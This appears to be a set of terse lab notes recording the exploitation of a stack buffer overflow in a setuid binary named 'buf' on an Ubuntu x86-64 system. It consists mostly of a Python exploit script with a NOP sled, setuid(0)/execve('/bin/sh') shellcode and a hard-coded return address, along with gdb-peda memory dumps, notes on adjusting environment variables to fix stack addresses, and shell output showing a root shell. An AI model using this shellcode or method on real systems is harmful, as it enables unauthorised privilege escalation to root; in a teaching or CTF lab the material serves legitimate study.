ubuntu@ubuntu:~/smash$ python setuid.py 
Input was: ????????????????????????????????????????????????????H1??iH1?H??/bin/shH?SH??H1?PWH??;j_j<XAAAAAAAAAAAABBBBBBBB?????
ubuntu@ubuntu:~/smash$ 

ubuntu@ubuntu:~/smash$ export LINES=38
ubuntu@ubuntu:~/smash$ export COLUMNS=143
ubuntu@ubuntu:~/smash$ python setuid.py 
Input was: ????????????????????????????????????????????????????H1??iH1?H??/bin/shH?SH??H1?PWH??;j_j<XAAAAAAAAAAAABBBBBBBB?????
# id && whoami && uname -a
uid=0(root) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
root
Linux ubuntu 4.15.0-51-generic #55-Ubuntu SMP Wed May 15 14:27:21 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
# 

used 0x7fffffffe390 + 8 = 0x7fffffffe398

ubuntu@ubuntu:~/smash$ cat setuid.py 
from subprocess import call
nop='\x90'*52     #nop sled
shellcode='\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05'
junk='A'*12+'B'*8
ret='0x7fffffffe398'    #return address
return_addr=(ret[2:].decode('hex'))[::-1] #convert return address to little endian. Could have used struct.pack('I',ret) but it doesn't support 64bit address
payload = nop + shellcode + junk + return_addr #final payload
call(['./buf',payload])                         #execute program with payload as argument
ubuntu@ubuntu:~/smash$ 

using 0x7fffffffe390

ubuntu@ubuntu:~/smash$ python setuid.py 
Input was: ????????????????????????????????????????????????????H1??iH1?H??/bin/shH?SH??H1?PWH??;j_j<XAAAAAAAAAAAABBBBBBBB?????
# 

0x7fffffffe370
ubuntu@ubuntu:~/smash$ python setuid.py 
Input was: ????????????????????????????????????????????????????H1??iH1?H??/bin/shH?SH??H1?PWH??;j_j<XAAAAAAAAAAAABBBBBBBBp????
ubuntu@ubuntu:~/smash$ 

0x7fffffffe380
ubuntu@ubuntu:~/smash$ python setuid.py 
Input was: ????????????????????????????????????????????????????H1??iH1?H??/bin/shH?SH??H1?PWH??;j_j<XAAAAAAAAAAAABBBBBBBB?????
ubuntu@ubuntu:~/smash$ 

0x7fffffffe370:   0x9090909090909090   0x9090909090909090
0x7fffffffe380:   0x9090909090909090   0x9090909090909090
0x7fffffffe390:   0x9090909090909090   0x9090909090909090
0x7fffffffe3a0:   0xb0ff314890909090   0xbb48d23148050f69


x/60x 0x7fffffffe370


gdb-peda$ x/60x 0x7fffffffe370
0x7fffffffe370:   0x9090909090909090   0x9090909090909090
0x7fffffffe380:   0x9090909090909090   0x9090909090909090
0x7fffffffe390:   0x9090909090909090   0x9090909090909090
0x7fffffffe3a0:   0xb0ff314890909090   0xbb48d23148050f69
0x7fffffffe3b0:   0x68732f6e69622fff   0xe789485308ebc148
0x7fffffffe3c0:   0xe689485750c03148   0x6a5f016a050f3bb0
0x7fffffffe3d0:   0x41414141050f583c   0x4141414141414141
0x7fffffffe3e0:   0x4242424242424242   0x00007fffffffe390
0x7fffffffe3f0:   0x0000000000000002   0x00007fffffffe4c8
0x7fffffffe400:   0x0000000200008000   0x0000000000400537
0x7fffffffe410:   0x0000000000000000   0x63824bc60eb67116
0x7fffffffe420:   0x0000000000400450   0x00007fffffffe4c0
0x7fffffffe430:   0x0000000000000000   0x0000000000000000
0x7fffffffe440:   0x9c7db4b9c2567116   0x9c7da406b3287116
0x7fffffffe450:   0x00007fff00000000   0x0000000000000000
0x7fffffffe460:   0x0000000000000000   0x00007ffff7de5733
0x7fffffffe470:   0x00007ffff7dcb638   0x000000001bfb4fc9
0x7fffffffe480:   0x0000000000000000   0x0000000000000000
0x7fffffffe490:   0x0000000000000000   0x0000000000400450
0x7fffffffe4a0:   0x00007fffffffe4c0   0x000000000040047a
0x7fffffffe4b0:   0x00007fffffffe4b8   0x000000000000001c
0x7fffffffe4c0:   0x0000000000000002   0x00007fffffffe701
0x7fffffffe4d0:   0x00007fffffffe718   0x0000000000000000
0x7fffffffe4e0:   0x00007fffffffe797   0x00007fffffffed83
0x7fffffffe4f0:   0x00007fffffffedb5   0x00007fffffffedd7
0x7fffffffe500:   0x00007fffffffede6   0x00007fffffffedf7
0x7fffffffe510:   0x00007fffffffee0b   0x00007fffffffee19
0x7fffffffe520:   0x00007fffffffee2a   0x00007fffffffee36
0x7fffffffe530:   0x00007fffffffee4d   0x00007fffffffee56
0x7fffffffe540:   0x00007fffffffee68   0x00007fffffffee89

gdb-peda$ pdisass 0x7fffffffe370
Dump of assembler code from 0x7fffffffe370 to 0x7fffffffe390:: Dump of assembler code from 0x7fffffffe370 to 0x7fffffffe390:
   0x00007fffffffe370:  nop
   0x00007fffffffe371:  nop
   0x00007fffffffe372:  nop
   0x00007fffffffe373:  nop
   0x00007fffffffe374:  nop
   0x00007fffffffe375:  nop
   0x00007fffffffe376:  nop
   0x00007fffffffe377:  nop
   0x00007fffffffe378:  nop
   0x00007fffffffe379:  nop
   0x00007fffffffe37a:  nop
   0x00007fffffffe37b:  nop
   0x00007fffffffe37c:  nop
   0x00007fffffffe37d:  nop
   0x00007fffffffe37e:  nop
   0x00007fffffffe37f:  nop
   0x00007fffffffe380:  nop
   0x00007fffffffe381:  nop
   0x00007fffffffe382:  nop
   0x00007fffffffe383:  nop
   0x00007fffffffe384:  nop
   0x00007fffffffe385:  nop
   0x00007fffffffe386:  nop
   0x00007fffffffe387:  nop
   0x00007fffffffe388:  nop
   0x00007fffffffe389:  nop
   0x00007fffffffe38a:  nop
   0x00007fffffffe38b:  nop
   0x00007fffffffe38c:  nop
   0x00007fffffffe38d:  nop
   0x00007fffffffe38e:  nop
   0x00007fffffffe38f:  nop
End of assembler dump.


gdb-peda$ x/60x $rip
0x40057e <main+71>:  0x89495641574190c3   0x258d4c54415541d7
0x40058e <__libc_csu_init+14>:   0x2d8d48550020087e   0xfd8941530020087e
0x40059e <__libc_csu_init+30>:   0x8348e5294cf68949   0x4fe803fdc14808ec
0x4005ae <__libc_csu_init+46>:   0x2074ed8548fffffe   0x000000841f0fdb31
0x4005be <__libc_csu_init+62>:   0xf6894cfa894c0000   0x48dc14ff41ef8944
0x4005ce <__libc_csu_init+78>:   0xea75dd394801c383   0x5c415d5b08c48348
0x4005de <__libc_csu_init+94>:   0x90c35f415e415d41   0x000000841f0f2e66
0x4005ee:   0x83480000c3f30000   0x00c308c4834808ec
0x4005fe:   0x6e49000200010000   0x3a73617720747570
0x40060e:   0x1b0100000a732520   0x0006000000383b03
0x40061e:   0x0094fffffe0c0000   0x0054fffffe3c0000
0x40062e:   0x0080fffffe6c0000   0x00bcffffff230000
0x40063e:   0x00dcffffff6c0000   0x0124ffffffdc0000
0x40064e:   0x0000000000140000   0x780100527a010000
0x40065e:   0x019008070c1b0110   0x001c000000101007
0x40066e:   0x002bfffffde00000   0x0014000000000000
0x40067e:   0x7a01000000000000   0x0c1b011078010052
0x40068e:   0x0010000001900807   0xfde40000001c0000
0x40069e:   0x000000000002ffff   0x0030000000240000
0x4006ae:   0x0030fffffd700000   0x180e46100e000000
0x4006be:   0x3f008008770b0f4a   0x00002224332a3b1a
0x4006ce:   0x00580000001c0000   0x0048fffffe5f0000
0x4006de:   0x0286100e41000000   0x08070c4302060d43
0x4006ee:   0x0078000000440000   0x0065fffffe880000
0x4006fe:   0x028f100e42000000   0x200e45038e180e42
0x40070e:   0x48058c280e42048d   0x83380e480686300e
0x40071e:   0x41380e72400e4d07   0x200e42280e41300e
0x40072e:   0x0e42100e42180e42   0x00c0000000100008
0x40073e:   0x0002fffffeb00000   0x0000000000000000
0x40074e:   0x0000000000000000   0x0000000000000000
gdb-peda$ 


gdb-peda$ x/60x $rsp
0x7fffffffe3e8:   0x00007fffffffe390   0x0000000000000002
0x7fffffffe3f8:   0x00007fffffffe4c8   0x0000000200008000
0x7fffffffe408:   0x0000000000400537   0x0000000000000000
0x7fffffffe418:   0x63824bc60eb67116   0x0000000000400450
0x7fffffffe428:   0x00007fffffffe4c0   0x0000000000000000
0x7fffffffe438:   0x0000000000000000   0x9c7db4b9c2567116
0x7fffffffe448:   0x9c7da406b3287116   0x00007fff00000000
0x7fffffffe458:   0x0000000000000000   0x0000000000000000
0x7fffffffe468:   0x00007ffff7de5733   0x00007ffff7dcb638
0x7fffffffe478:   0x000000001bfb4fc9   0x0000000000000000
0x7fffffffe488:   0x0000000000000000   0x0000000000000000
0x7fffffffe498:   0x0000000000400450   0x00007fffffffe4c0
0x7fffffffe4a8:   0x000000000040047a   0x00007fffffffe4b8
0x7fffffffe4b8:   0x000000000000001c   0x0000000000000002
0x7fffffffe4c8:   0x00007fffffffe701   0x00007fffffffe718
0x7fffffffe4d8:   0x0000000000000000   0x00007fffffffe797
0x7fffffffe4e8:   0x00007fffffffed83   0x00007fffffffedb5
0x7fffffffe4f8:   0x00007fffffffedd7   0x00007fffffffede6
0x7fffffffe508:   0x00007fffffffedf7   0x00007fffffffee0b
0x7fffffffe518:   0x00007fffffffee19   0x00007fffffffee2a
0x7fffffffe528:   0x00007fffffffee36   0x00007fffffffee4d
0x7fffffffe538:   0x00007fffffffee56   0x00007fffffffee68
0x7fffffffe548:   0x00007fffffffee89   0x00007fffffffeeca
0x7fffffffe558:   0x00007fffffffeedd   0x00007fffffffeee9
0x7fffffffe568:   0x00007fffffffeeff   0x00007fffffffef0f
0x7fffffffe578:   0x00007fffffffef23   0x00007fffffffef2b
0x7fffffffe588:   0x00007fffffffef3a   0x00007fffffffef59
0x7fffffffe598:   0x00007fffffffefc1   0x0000000000000000
0x7fffffffe5a8:   0x0000000000000021   0x00007ffff7ffa000
0x7fffffffe5b8:   0x0000000000000010   0x00000000178bfbff

```

### Manage environment variables in gdb

```shell


https://scc.ustc.edu.cn/zlsc/sugon/intel/debugger/cl/commandref/gdb_mode/cmd_unset_enviro.htm

gdb-peda$ show environment
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
SSH_CONNECTION=192.168.0.25 49765 192.168.0.35 22
LESSCLOSE=/usr/bin/lesspipe %s %s
LANG=en_US.UTF-8
OLDPWD=/home/ubuntu
S_COLORS=auto
XDG_SESSION_ID=4
USER=ubuntu
PWD=/home/ubuntu/smash
LINES=38
HOME=/home/ubuntu
SSH_CLIENT=192.168.0.25 49765 22
XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
SSH_TTY=/dev/pts/0
COLUMNS=143
MAIL=/var/mail/ubuntu
TERM=xterm-256color
SHELL=/bin/bash
SHLVL=1
LOGNAME=ubuntu
XDG_RUNTIME_DIR=/run/user/1000
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
LESSOPEN=| /usr/bin/lesspipe %s
_=/usr/bin/gdb
gdb-peda$ 

unset environment LINES
unset environment COLUMNS


gdb-peda$ show environment
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
SSH_CONNECTION=192.168.0.25 49765 192.168.0.35 22
LESSCLOSE=/usr/bin/lesspipe %s %s
LANG=en_US.UTF-8
OLDPWD=/home/ubuntu
S_COLORS=auto
XDG_SESSION_ID=4
USER=ubuntu
PWD=/home/ubuntu/smash
HOME=/home/ubuntu
SSH_CLIENT=192.168.0.25 49765 22
XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
SSH_TTY=/dev/pts/0
MAIL=/var/mail/ubuntu
TERM=xterm-256color
SHELL=/bin/bash
SHLVL=1
LOGNAME=ubuntu
XDG_RUNTIME_DIR=/run/user/1000
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
LESSOPEN=| /usr/bin/lesspipe %s
_=/usr/bin/gdb
gdb-peda$ 

b *main+71

gdb-peda$ r $(python -c "print '\x90'*52+'\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05'+'A'*12+'B'*8+'\x90\xe3\xff\xff\xff\x7f'")

gdb-peda$ x/60x $rsp-200
0x7fffffffe340:   0x00007ffff7ffea98   0x0000000000000000
0x7fffffffe350:   0x0000000000000000   0x00007fffffffe380
0x7fffffffe360:   0x0000000000000000   0x00007ffff7ffe170
0x7fffffffe370:   0x0000000000000001   0x0000000000400578
0x7fffffffe380:   0x00007fffffffe4e8   0x0000000200000000
0x7fffffffe390:   0x9090909090909090   0x9090909090909090
0x7fffffffe3a0:   0x9090909090909090   0x9090909090909090
0x7fffffffe3b0:   0x9090909090909090   0x9090909090909090
0x7fffffffe3c0:   0xb0ff314890909090   0xbb48d23148050f69
0x7fffffffe3d0:   0x68732f6e69622fff   0xe789485308ebc148
0x7fffffffe3e0:   0xe689485750c03148   0x6a5f016a050f3bb0
0x7fffffffe3f0:   0x41414141050f583c   0x4141414141414141
0x7fffffffe400:   0x4242424242424242   0x00007fffffffe390
0x7fffffffe410:   0x0000000000000002   0x00007fffffffe4e8
0x7fffffffe420:   0x0000000200008000   0x0000000000400537
0x7fffffffe430:   0x0000000000000000   0x3ccc988909073d26
0x7fffffffe440:   0x0000000000400450   0x00007fffffffe4e0
0x7fffffffe450:   0x0000000000000000   0x0000000000000000
0x7fffffffe460:   0xc33367f6ca273d26   0xc3337749b4993d26
0x7fffffffe470:   0x00007fff00000000   0x0000000000000000
0x7fffffffe480:   0x0000000000000000   0x00007ffff7de5733
0x7fffffffe490:   0x00007ffff7dcb638   0x000000001b1ce55e
0x7fffffffe4a0:   0x0000000000000000   0x0000000000000000
0x7fffffffe4b0:   0x0000000000000000   0x0000000000400450
0x7fffffffe4c0:   0x00007fffffffe4e0   0x000000000040047a
0x7fffffffe4d0:   0x00007fffffffe4d8   0x000000000000001c
0x7fffffffe4e0:   0x0000000000000002   0x00007fffffffe716
0x7fffffffe4f0:   0x00007fffffffe72d   0x0000000000000000
0x7fffffffe500:   0x00007fffffffe7ac   0x00007fffffffed98
0x7fffffffe510:   0x00007fffffffedca   0x00007fffffffedec
gdb-peda$ 

unset LINES
unset COLUMNS

using 0x7fffffffe3b0

ubuntu@ubuntu:~/smash$ python setuid.py 
Input was: ????????????????????????????????????????????????????H1??iH1?H??/bin/shH?SH??H1?PWH??;j_j<XAAAAAAAAAAAABBBBBBBB?????
# 


```

